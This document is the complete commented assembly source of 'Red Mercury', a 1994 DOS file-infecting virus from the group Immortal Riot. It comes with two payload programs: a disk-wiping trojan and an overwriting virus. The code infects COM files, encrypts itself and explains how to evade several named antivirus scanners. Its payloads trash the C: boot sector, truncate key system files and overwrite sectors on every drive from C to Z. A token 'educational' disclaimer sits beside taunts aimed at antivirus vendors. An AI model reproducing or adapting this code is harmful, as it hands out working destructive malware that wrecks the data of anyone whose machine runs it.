;			 Red Mercury 1.00
;      "Created by Immortal Riot's destructive development team"
;              (c) '94 The Unforgiven/Immortal Riot 
;
;     "If Red Mercury doesn't exist, neither does this virus".
;
; Notes:
;  F-prot, Scan, TBAV, FindViru, can't find shits of this virus.
;
; Disclamer:
;  I take no resposible for any destructive use of this virus, it's
;  programmed in educational purposes only. Thank you.
; 
; Dedication:
;  I dedicate this virus to all of Immortal Riot, b'cos we're having
;  such a nice time doing this toghether. Also, hugs to all AV-wankers.

.MODEL TINY                     ;
.CODE		                ; ASM!
ORG    256d                     ; 100h
				;
Virus_start:			;
xchg ax, ax                     ; NOP!
nop				; NOP!
				; To fool TBAV, from detecting Burma,
                                ; ie (hex) B8 01 FA, but also so we
                                ; don't infect the orginal-virus.
				;
mov ax,0fa01h                   ; Let's un-install MSAV junk program
mov dx,5945h                    ; from memory for a cost of 8 bytes :)
int 16h                         ; 
				; 
call get_delta_offset		; I just call.. ...to find the offset!
real_start:			;
				;
Get_delta_offset:               ; Get the delta-offset
pop bp			        ; with the same old trick
sub bp, offset get_delta_offset ; as always
				;
Call_en_de_crypt:               ; This code, does the exact same thing as
mov ax,bp                     	; a "call en_de_crypt", though it take
add ax,11Ah			; a few more bytes. If we use the "usual"
push ax                         ; code, F-Prot will detect it as Radym,
jmp short en_de_crypt           ; that The Attitude Adjuster/Virulent Grafitti
                                ; wrote some years back. For more info about
                                ; all offset's, tasm with /la (listening)
				;
jmp short real_code_start       ; Then, we'll continue..
        			;
encryption_value dw 0		; Random value to use as the XOR-value,
				; place this in a un-encrypted area
				;
Write_virus:		        ; Infect the victim's!
call en_de_crypt	        ; Write encrypted copy
				;
lea cx, virus_end-256d	        ; Write from 100h to virus_end,
lea dx,[bp]		        ; ie, write all of this code! 
mov ax,word ptr [bp+virus_end+1ah+2]     
inc ah				; add ah,1 won't work here.       
add dx,ax			;	    
mov ah,64d			; The 40hex joke (again)
int 21h				;            
				;
call en_de_crypt		; Return to the un-encrypted beginning
ret				; and then we jump to real-code-start:
;-------------------------------------------------------------------------------
; In the encryption, the most important to think about is to encrypt ONLY 
; the thing that you can encrypt for getting a virus working. That is 
; (in this virus) the code between real_code_start to the rest of the virus. 
;
; It would be smarter to place the encryption and the write_virus routine as 
; the last end of the code, b'cos of that would make the virus harder to 
; debug/dissassemble than it's now. Also it would have saved some bytes
; as well. (Shoddy coding and damn stupid, heh?)
;-------------------------------------------------------------------------------
En_de_crypt:			           ; 
					   ;
mov ax,word ptr [bp+encryption_value]      ; Value to encrypt with
lea si,[bp+real_code_start]	           ; 
mov cx,(virus_end-real_code_start+1)/2     ; Part of code to encrypt

loop_again:
xor word ptr [si],ax            ; Nice little function
inc si                          ; Add si,2
inc si		                ; ^^ Cost one more byte
				;
loop loop_again                 ; Encrypt two bytes/loop (word), until
ret                             ; real_code_start to virus_end is encrypted
				;
Real_code_start:                ; All instructions below will
                                ; in the infected file be
                                ; encrypted, thus making it hard
                                ; to analyse for heuristic A-V.
				;
cld                             ; Clear direction flag
				;
Set_Dta:			;
mov ah,1ah                      ; Set the DTA-area to the  
lea dx,[bp+virus_end]           ; end of the file, and we'll
int 21h                         ; save some bytes. We don't use
                                ; de default 80h b'cos that will
                                ; overwrite the parameters in the
                                ; original program.
Buffer_Xfer:                    ;
lea si,[bp+first_bytes]		; Transer the first four
lea di,[bp+@buf]		; instructions to a buffer
                                ; in memory, so the original
				; program can execute later on
				;
xor cx,cx                       ; Mov cx,2 is smaller/faster,
add cx,2                        ; but this is clearer/dumber.
				;
rep movsw			; (Move string by word), allows you to
                                ; copy entire regions of memory 
                                ; (buffers) from one place to anther with
                                ; only that command "rep movsw".
				;
mov di,4		        ; Infection-Counter, max 4 / run
                                ; Will be decreaced each time we set back
                                ; our old attribs (ie, after file-infection)
				;
Get_drive:			;
mov ah,19h			; Get the drive from where we're
int 21h                         ; executed from
				;
cmp ax,0fh                      ; Is disk-drive invalid?
je  Floppy_exec                 ; Yep, then, jump and play that we're
                                ; executed from A:. Totally meaningless
                                ; really, b'cos a file can't be executed
                                ; from a in-valid drive. 
				;
cmp al,2			; A: or B:?
jnb check_ram		        ; Nop, not from a floppy drive
				;
Floppy_exec:                    ;
jmp on_floppy                   ; If they execute us from a floppy
                                ; they might have noticed our 
                                ; existence and are keeping us under
                                ; investigations. Then we can as well
                                ; trash that sucker before it's too late.
				;
Check_RAM:			; Some people use G: as a RAM-drive,
cmp al,6			; that is under 4 Mb, ie, not much
je  floppy_Exec		        ; to infect, so, we crash them here,
                                ; as well.
                                ;
Get_dir:			; If we aren't executed from A B or G:
mov ah,47h		        ; we'll just continue, and now, get
xor dl,dl			; the directory from where we're being
lea si,[bp+virus_end+2ch]       ; executed from.
int 21h				;
				;
Find_First:			; Find first file with,
mov cx,111b			; any attributes and with
lea dx,[bp+filemask]	        ; the extension of 'COM'
mov ah,4eh			; 
_4fh:                           ; AH=4FH, (Find Next File), this 
int 21h			        ; smart little trick will save us
                                ; plenty of bytes, compared to writing
                                ; the whole file-search routine twice!
				;
jnc clear_file_attribs          ; We did find a file!
                                ; Happy Happy, Joy Joy!
				;
jmp ch_dir                      ; We didn't find a file, so let's
                                ; try in another directory
                                ;
Clear_file_attribs:		; 
mov ax,4301h                    ; Set file attribs to
sub cx,cx                       ; nothing.
lea dx,[bp+virus_end+1eh]	;
int 21h				;
				;
Open_file:			; Open file          (AH=3DH)
mov ax,3d02h                    ; in read/write mode (AL=02H)
int 21h                         ; 
xchg ax,bx			; File handle in BX
				;
Read_file:			; 
mov ah,3fh			; Read file (or device)
mov cx,4			; Number of bytes to read
lea dx,[bp+first_bytes]	        ; What to read
int 21h				;
				;
Check_already_infected:		; Check if file already is infected,
                                ; or some other file that we don't
                                ; want to infect
				;
mov si,dx			; Put the first_bytes that now is in DX in
lea si,[bp+first_bytes]         ; SI. Compare with our own jmp-construction
cmp word ptr [si],0e990h        ; and if it match (is equal), then
je already_infected		; don't re-infect it.
				;
cmp word ptr [si],5a4dh	        ; We'll also check if a file is a 
                                ; renamed EXE file, b'cos they will
                                ; also un-infected work perfectly.
                                ; First check the beginning for a ZM?
je  already_infected	        ; If so, then, don't infect it!
cmp word ptr [si],4d5ah         ; But EXE files can also begin with MZ,
je  already_infected            ; and then, don't infect it.
				;
cmp byte ptr [si+1],26h   	; We'll not infect files that starts
je  already_infected            ; with a ' &' (Psychosis infection).
				;
cmp word ptr [si],9090h         ; Don't infect files that starts 
je  already_infected            ; with a double-NOP (90h), the classic
                                ; infection-marker for viruses
				;
mov ax,word ptr [bp+virus_end+1ah]      
cmp ax,400			; We'll not infect files that is smaller
jb already_infected	        ; than 400 bytes or bigger than 63000
cmp ax,63000                    ; The small b'cos of we don't want 
ja already_infected             ; debuggers to do a 5 byte "dummy" file,
cmp ax,1701                     ; and in the case of big COM files, the
je already_infected             ; message "Program to big to fit in memory"
                                ; displayed. Also, we will not infect files
                                ; that is 1701 bytes long. Pretty dumb, huh?
				;
cmp word ptr [bp+virus_end+35],'DN'  
jz already_infected		; We'll not infect command.com, b'cos
                                ; of many people check that file for virus,
				; and also b'cos of normal people don't
                                ; got to much file under the root-dir anyhow.
;-------------------------------------------------------------------------------
; Here is the "tricky" part. First we'll move the file pointer to end of file,
; take 4 bytes from a buffer, containing (now), nothing, then, load it with 
; our own instructions and write it to the beginning of the file. After that, 
; we'll move to end_of_file and call the procedure in the beginning 
; (un-encrypted area!) that writes the virus to the end of the infected file 
;-------------------------------------------------------------------------------
Move_file_pointer_2_EOF:	;
mov ax,4202h		        ; AH, 42h = Set current file pointer
                                ; (Current location in file), and
                                ; AL, 02H = Signed offset from end of file
xor cx, cx                      ; Most significal half of offset (zero)
xor dx, dx			; Least significal half of offset (zero)
int 21h                         ;
				;
sub ax,4			; Subtract the first four bytes, which
				; will be overwritten with the instructions
                                ; that we took from End of File, that was
                                ; stored in an empty buffer "Istbuf"
                       		;
Fill_1st_buf:			; Now, load the 1stbuf with
mov word ptr [bp+Istbuf],0e990h ; with a Nop and a jump to the
mov word ptr [bp+Istbuf+2],ax	; virus beginning
				;
Move_file_pointer_2_TOF:        ; Set current file pointer to
mov ax,4200h		        ; the beginning of file (00h)
int 21h                     	;
				;
Write_first4:			;
mov ah,64d			; Write the new instructions
mov cx,4                        ; to the beginning of the file
lea dx,[bp+Istbuf]              ; with the buffer we just loaded
int 21h                         ; 
				;
Mov_2_EOF_again:		; It would be smarter to call write_virus
mov ax,4202h		        ; before we moved the file-pointer to 
xor cx,cx                       ; Top_of_file, instead of moving the file-
xor dx,dx                       ; pointer to End_of_File twice, but IMHO
int 21h                         ; it doesn't really matters anyhow.
				;
Get_random:			;
mov ah,2ch                      ; Get a random value from the clock
int 21h                         ; to use for the encryption so the A-V
add dl, dh                      ; must place the string at the encryption
                                ; routine, thus making it easy to mutate
                                ; later on...
				;
jz get_random                   ; If we get the value zero (no encryption)
mov word ptr [bp+encryption_value],dx   ; we'll loop that procedure until
				; 	  we get a higher value
				;
call write_virus		; Now, write the virus code from 100h
                                ; (Where this file start) to end_of_file)
                                ; to the end of file in the opened file.
				;
jmp short restore_time_date     ; Then we'll cover our tracks
				;
Already_infected:	        ; If a file already is infected
inc di				; increase DI (used for infection counter)
                                ; with one. 
				;
Restore_Time_Date:	        ; We'll set back the file time/date to 
lea si,[bp+virus_end+16h]	; what it was before we touched it
mov cx,word ptr [si]		; CX=Time
mov dx,word ptr [si+2]		; DX=Date
mov ax,5701h			; AH=57h AL=01h = Set time/date
int 21h				;
				;
Close_file:			; Close the file which now is infected
mov ah,3eh			;
int 21h				;
				;
Set_old_attrib:		        ; Restore old file-attribs, because of 
mov ax,4301h                    ; before we infected the file, we cleared
xor ch,ch			; the file attributes, so even the hidden,
mov cl,byte ptr [bp+virus_end+15h] ;and write protected files get infected
lea dx,[bp+virus_end+1eh]	;
int 21h				;     (AH=43H AL = 01 = Set Attribs)
				;
Enough_files:			;
dec di				; Decrease the infection counter with 1
cmp di,0		        ; and check if we've infected enough
je no_more_files	        ; Di=0, we're done with the infection
				;
mov ah,4fh			; Nope, we want more files to infect
jmp _4fh                        ; and we'll do this until we're finished
				;
On_Ram:				;
On_Floppy:                      ; We are executed from
                                ; A B or G:
				;
mov ah,2ch                      ; Get time (dl=1/100 of a second)
int 21h				;
cmp dl,50                       ; That is 50% chanse that we're bad,
ja Trash_Boot_Sector		; or REAL bad.
jmp droppie		        ; (Blame Caro, Blame Caro!)
                                ; This might look stupid, not to "ja droppie"
                                ; since I got the Trash_Boot_Sector as the
                                ; next procedure anyhow. But that would result
				; in a "Relative jump out of range by 0004h
                                ; bytes" since we with a short/condition jmp 
                                ; only can jump 128 bytes forward in the code.
				;
Trash_boot_Sector:		; We might be executed from a A B or G:
				; or the date is the 31:st, we will
mov ax,0301h			; destroy the boot-sector on drive C:
mov cx,0001h			;
mov dx,0080h			; 80h = C: 00h = A:
lea bx,[bp+virus_start]		; Overwrite with our own virus code
int 13h				;
				;
Truncate_Files:			; 
mov  dx, offset file1           ; c:\Autoexec.bat
call trunc_it		        ;
mov  dx, offset file2           ; c:\Config.sys
call trunc_it		        ;
mov  dx, offset file3           ; c:\Command.com
call trunc_it		        ;
call restore_start		;
				;
Trunc_it:			; We'll truncate the somehow important
mov ah,3ch	                ; files after we've trashed the boot-sector
mov cx,110b	                ; and if something screws up, we'll jump
int 21h		                ; and check for what else we can do that
jc  no_more_files		; clearly mainifests our presence to even
ret				; the uninitiated. Ie, of plain cruelness :).
				;
No_more_files:		        ; We didn't find any more file, or
                                ; the infection counter is zero.
				;
mov ah,2ch                      ; We'll get a 1/100 of a second,
int 21h				; and if the value we get is "1",
cmp dl,1			; we'll jump to a nice pay-load.
je  overwriting                 ; Otherwise, we continue and check
           			; what else we can do..
Dates:				;
mov ah,2ah                      ; Get Date, and compare it to,
int 21h				;
				;
cmp dl,31                       ; 31:st?
je  trash_boot_sector           ; Yep!
				;
Dee_day:			; 
cmp  dx, _0606                  ; Date 0606?
je   droppie			; Yep!
				;
cmp dx, _0707			; Date 0707?
je  droppie			; Yep!
				;
cmp dx, _0808			; Date 0808?
je  droppie			; Yep!
				;
cmp dx, _0909			; Date 0909?
je  overwriting			; Yep!
				;
cmp dx, _0505			; Date 0505?
je  overwriting			; Yep!
				;
                                ; If no conditions-matched, or we
                                ; just return here from another 
                                ; pay-load that called us, we'll,
Restore_start:			; Copy the 4bytes to the
lea si,[bp+@buf]		; beginning of this file
mov di,256d                     ; in memory (100h)
movsw                           ;            
movsw				;
				;
Restore_dir:		        ; Change back to the directory
lea dx,[bp+virus_end+2ch]	; from where we were executed,
mov ah,3bh                      ; b'cos of we used the dot-dot
int 21h                         ; method to travel around..
				;
Exit_proc:		        ; Now, it's time to give the control
mov bx,100h		        ; to the "real" program. This is of'cos
push bx				; encrypted, otherwise, TBAV would detect
xor ax,ax			; it as "back-to-entry-point". 
retn				;
				;
Ch_dir:				;
mov ah,3bh			; Change directory to '..'
lea dx,[bp+dot_dot]	        ; "Mov dx, offset dot_dot" won't work!
int 21h                         ; 
Root_Dir:			; AX is probably 03h, ie, location doesn't
jc no_more_files		; exist. (Trying) to goto dot-dot from '\'.
				;
No_err:			        ; Return to routine that jumped to ch_dir,
jmp find_first                  ; and search for the first file in that 
				; directory
				;
Droppie:			; Since I use the drop-file routine for
call Cr_file			; two different pay-loads, it's smarter
                                ; to call the create/file and close/file
				; instead of writing them twice, I think.
                                ; (Saving bytes equ loosing speed).
                                ;
Write_File:			; Then, we'll write to it.
mov     ax,bx			; File handle in BX
mov     ah,64d		        ; 40HEX!
mov     cx,trashlenght          ; Number of bytes to write
lea     dx,[bp+fuck_disks]      ; What to write
int     21h                     ;
				;
Close_target_file:              ; 
mov     ah,3eh			; Close the file c:\dos\keyb.com
int     21h			; Then, we'll returning
jmp     short restore_start     ; nice and un-noticed!
				;
Overwriting:			; 
call Cr_file			; Create/Truncate the file,
				; in wich we'll write our
Write_2nd_Pay_Load:		; "a-bit-nicer-than-droppie-pay-load",
xchg    ax,bx			; that will force them to re-install
mov     ah,40h			; DOS. Pretty harmless, but fun!
mov     cx,ow_lenght	        ;
lea     dx,[bp+ow_vir]		;
                                ;
int     21h                     ; Saving 3 bytes by calling this
call    Close_Target_File	; procedure instead of writing it again!
				;
Cr_File:			;
mov     ah,3ch                  ; Create/Truncate a file
mov     cx,0                    ; Attribs=Noting
lea     dx,[bp+filename]	; What file to create
int     21h		        ; 
ret				;
;-------------------------------------------------------------------------------
; These "garbage" text is really code, that we'll drop under circum conditions
; to c:\dos\keyb.com. The ow_vir is an overwriting virus, and the trash_disks
; is a plain, simple and highly destructive trojan. Use with care!

Ow_vir   db "è ë$  ¾)‹¹ .1FFâùÃèë",0ffh,"º ´@±QÍ!èß",0ffh,"ÃºM´NÍ!sÃ¸=ºž Í!Çú “èÔ",0ffh,"´>Í!´Oëá*.* "
Ow_lenght equ $-ow_vir	
			
Fuck_disks db '°¹w»™Í&þÀ<u÷ÃI hereby annex this sector as the property of IR!'
Trashlenght     equ $-fuck_disks
;-------------------------------------------------------------------------------
V_name   db " Red Mercury (c) '94 The Unforgiven/Immortal Riot "

Filemask db '*IR.COM',0         ; Files to search for (*.com)
Dot_dot  db '..',0		; Directory to change to

Filename db 'c:\dos\keyb.com',0 ; File to trojanize
File1    db 'c:\autoexec.bat',0	; File to truncate
File2    db 'c:\config.sys',0	; File to truncate
File3    db 'c:\command.com',0  ; File to truncate

_0505 equ 0505h			; Day = 0606
_0606 equ 0606h			; Day = 0606
_0707 equ 0707h			; Day = 0707
_0808 equ 0808h			; Day = 0808
_0909 equ 0909h			; Day = 0909
				;
Buffers:			;
First_bytes db 90h,90h,50h,0c3h	; Jump construction
@buf        db 4 dup(0)	        ; Empty space to be
Istbuf      db 4 dup(0)	        ; filled with instructions
				;
Virus_end:			;
end virus_start			;
;-------------------------------------------------------------------------------
; Here follow the "pay-loads" used in Red Mercury:
;
;	    A little pay-load-trojan used in Red Mercury
;           --------------------------------------------

; Pay-load function:
;  This code will under some circumstances dropped in the file
;  c:\dos\keyb.com, that is called from autoexec.bat, which will
;  result in a total destruction on all harddrives.

; General-information.
;  It's a very very simple trojan, using int26h (sector write), 
;  it's like all trojan, very very small and fast and I wouldn't
;  suggest that you try it out. 

;  This is NOT thought to be used as a pure trojan, and I don't 
;  encourage you to only spread this file. That wouldn't be fair.

;  Greetings to all destructive virus writers! /The Unforgiven

.model tiny
.code
org    100h
start:

mov     al,2h           ; Al holds the number of drive, 2H=C: 3H=D:, etc
mov     cx,777h         ; 777H = 1911d (# of sectors to trash)
lea     bx,n1911        ; Just a little note
fuck_next:	        ; 
cwd                     ; Write from sector 0
int     26h		; Sector write
inc     al              ; Increase AL (Add 1# to drive C-D, etc)
cmp     al,25           ; Compare if al=25 (drive=Z)
jne     fuck_next	; If it isn't, jump and trash next drive
quit:                   ; Now it's time to quit.
RET                     ; 
n1911 db      'I hereby annex this sector as the property of IR!'
end start     
;-------------------------------------------------------------------------------
;           A little pay-load-virus used in Red Mercury
;           -------------------------------------------

; Pay-load function:
;  This will be dropped to the file c:\dos\keyb.com, that often
;  is called from autoexec.bat, which will result in that all files
;  in DOS being overwritten.

; General-information:
;  It's a simple overwriting virus, BUT not released "alone" as
;  the purpose as a virus that will infect systems and travel
;  around the world. It's rather an original pay-load, outsmarted
;  by my creative/destructive brain.

; Virus-information:
;  The virus will overwrite *.* in the directory from where it's
;  executed from. It will re-infect files, though the file increace
;  will not be noticed since it overwrites the beginning of the
;  files. The virus itself is 81 bytes, this could of'cos be a lot
;  more optimized, for example place the encryption-routine at the end, 
;  and exchange the encryption routine to something smaller but it's just 
;  the work of 10 minutes coding so I don't really care that much. Also,
;  I don't claim this to be specefic small nor good, so don't rag with
;  me, please.

; It's encrypted, and as I know, only F-Prot detects it.
; (Might be infected with an unknown virus). TbScan's normal heuristic 
; mode can't find it, and the most advanced mode in TbScan got a detection
; rate on about 30%. Scan can ofcause not detect it. /The Unforgiven

;                 Riot.Trivial.Pay.load.81.

.model tiny
.code
org    100h

virus_start:

call encrypt_decrypt             
jmp short encryption_start		 

encrypt_val dw 0		; Really really stupid..

encrypt_decrypt:
mov si, offset encryption_start
mov dx, encrypt_val
mov cx,(end_of_virus-encryption_start+1)/2

xor_loop:
xor word ptr cs:[si],dx
inc si
inc si
loop xor_loop
ret

write_virus:
call encrypt_decrypt		 
mov dx,100h                     ; Where to write from            
mov ah,40h                      ; 40hex!
mov cl,81                       ; Bytes to write
int 21h

call encrypt_decrypt
ret

encryption_start:               

Find_first_file:
mov dx,offset all		; Files to search for
mov ah,4eh                      ; Find first 

find_next:                      ; ah=4fh
int 21h

jnc open                        ; We find one!
;jmp exit                       ; Did not!, quitting.
ret                             ; This saves bytes!

open:
mov	ax,3d02h                ; Open in read/write mode
mov	dx,9eh                  ; Adress to filename to open
int	21h			;

mov encrypt_val,250		; Value to encrypt with

xchg ax,bx                      ; File handle in BX
call write_virus                ; Now, write the virus


close_file:
mov	ah,3eh			; Close the infected file
int	21h			;

mov     ah,4fh			; Find next file
jmp     short find_next         ;

all db '*.*',0                  ; Files to overwrite

virus_end:
end_of_virus:
end virus_start